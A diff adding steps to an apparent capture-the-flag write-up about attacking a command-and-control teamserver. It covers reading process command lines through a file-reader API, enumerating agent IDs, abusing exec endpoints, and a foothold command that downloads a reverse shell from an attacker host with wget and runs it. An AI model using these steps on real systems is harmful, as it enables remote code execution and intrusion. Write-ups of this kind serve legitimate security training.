@@ -105,3 +105,11 @@ Which binary you reverse doesn't matter so much, as much as what it does. Openin
   ```
   
   its unclear where this data lands
+  
+- to proceed, use the reader api to find the api code. this can be done by reading proc cmdline args, e.g. /proc/0/cmdline. One of these will be the app, and reveal the file being run is app.py. Opening this will show the site code.
+
+- teamserver.log will list whats been going on, and can reveal the other agent uids (this can also be retrieved from /api/agents)
+- /api/server/exec will run an arbitrary 'cmd' on the server
+- /api/agents/UID/exec will set the next 'cmd' the agent should run - note this is from the set list of commands
+
+- to get a foothold, I sent a cmd to the www-infinity client, `exec wget attacker-ip:1234/revshell` and then `exec chmod +x revshell && ./revshell`
